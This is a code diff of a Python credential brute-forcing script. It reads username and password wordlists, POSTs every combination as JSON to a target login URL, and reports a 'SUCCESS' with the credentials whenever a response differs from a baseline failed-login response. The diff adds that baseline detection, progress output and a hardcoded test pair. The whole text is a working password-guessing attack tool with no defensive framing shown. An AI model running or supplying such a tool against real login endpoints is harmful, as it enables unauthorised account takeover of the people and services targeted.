@@ -4,26 +4,42 @@ from pathlib import Path
 from urllib.parse import urlparse
 import sys
 
-def send(url,username,password):
+####################
+# global variables #
+####################
+found = False
 
-    # Data to send in the request body
+#get bad login response to make the filtering a good response
+def bad_request(url):
+    data = {
+        "email": "ImpossibleEmailqsdazer1234321",
+        "password": "ImpossiblePassowrdqsdazer1234321"
+    }
+    headers = {
+        "Content-Type": "application/json"
+    }
+    response = requests.post(url, json=data, headers=headers)
+    bad_request = {}
+    bad_request["status"] = response.status_code
+    bad_request["text"] = response.text
+    print("bad request status : "+str(response.status_code))
+    print("bad request text : "+response.text)
+    return bad_request
+
+def send(url,username,password,bad_request_data):
+    global found 
     data = {
         "email": username,
         "password": password
     }
-
-    # Optional headers (for example, JSON content type)
     headers = {
         "Content-Type": "application/json"
     }
-
-    # Send the POST request
     response = requests.post(url, json=data, headers=headers)
-
-    # Print the response status code and body
-    print("Status Code:", response.status_code)
-    if(response.status_code != 401):
+    if(response.status_code != bad_request_data["status"]):
+        print(f"\rSUCCESS username: {username} | password: {password}")
         print("Response Body:", response.text)
+        found = True
 
 def is_valid_url(url: str) -> bool:
     try:
@@ -66,15 +82,28 @@ def main(argv=None):
     if not is_valid_url(args.host):
         parser.error(f"Invalid host URL: {args.host}")
 
+    print("------------")
+    print("URL : "+host)
+    bad_request_data = bad_request(host)
+    print("------------")
+
     user_path = Path(args.user_file)
     pass_path = Path(args.pass_file)
 
     file_username = load_lines(user_path)
     file_password = load_lines(pass_path)
+    file_username.append("test@test.com")
+    file_password.append("tessttest")
 
     for user in file_username:
         for password in file_password:
-            send(host,user,password)
+            print(f"\rTrying username: {user} | password: {password}", end="")
+            send(host,user,password,bad_request_data)
+            print(f"\r", end="")
+    global found 
+    if not found:
+        print(f"\r----------------------------------------------------------")
+        print(f"\rFAILED")
 
     return 0
 
